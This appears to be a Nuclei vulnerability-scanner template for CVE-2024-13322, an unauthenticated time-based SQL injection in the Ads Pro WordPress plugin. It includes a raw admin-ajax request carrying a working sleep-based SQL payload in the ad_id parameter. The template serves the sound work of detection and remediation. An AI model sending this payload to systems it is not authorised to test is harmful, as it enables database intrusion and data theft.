http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - clicks
    - weekly_views
    - labels
  - dsl:
    - duration>=7
    type: dsl
  matchers-condition: and
  raw:
  - '@timeout: 30s

    POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    action=bsa_stats_chart_callback&ad_id=1+and+(select*from(select(sleep(0.7)))a)--
    -

    '
id: CVE-2024-13322
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cve-id: CVE-2024-13322
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-89
    epss-percentile: 0.94995
    epss-score: 0.18355
  description: 'The Ads Pro Plugin - Multi-Purpose WordPress Advertising Manager plugin
    for WordPress is vulnerable to SQL Injection via the ''a_id'' parameter in all
    versions up to, and including, 4.88 due to insufficient escaping on the user supplied
    parameter and lack of sufficient preparation on the existing SQL query.  This
    makes it possible for unauthenticated attackers to append additional SQL queries
    into already existing queries that can be used to extract sensitive information
    from the database.

    '
  impact: 'Unauthenticated attackers can extract sensitive information from the database
    including usernames, passwords, and other confidential data via SQL injection.

    '
  metadata:
    max-request: 1
    verified: true
  name: Ads Pro Plugin <= 4.88 - Unauthenticated SQL Injection
  reference:
  - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/ap-plugin-scripteo/ads-pro-plugin-multi-purpose-wordpress-advertising-manager-488-unauthenticated-sql-injection
  - https://codecanyon.net/item/ads-pro-plugin-multipurpose-wordpress-advertising-manager/10275010
  - https://www.wordfence.com/threat-intel/vulnerabilities/id/3bcb60a8-220f-45a4-a9a9-10f64acf470c?source=cve
  remediation: 'Update Ads Pro Plugin to a version newer than 4.88.

    '
  severity: high
  tags: cve,cve2024,sqli,time-based-sqli,wp,wp-plugin,wordpress,vuln
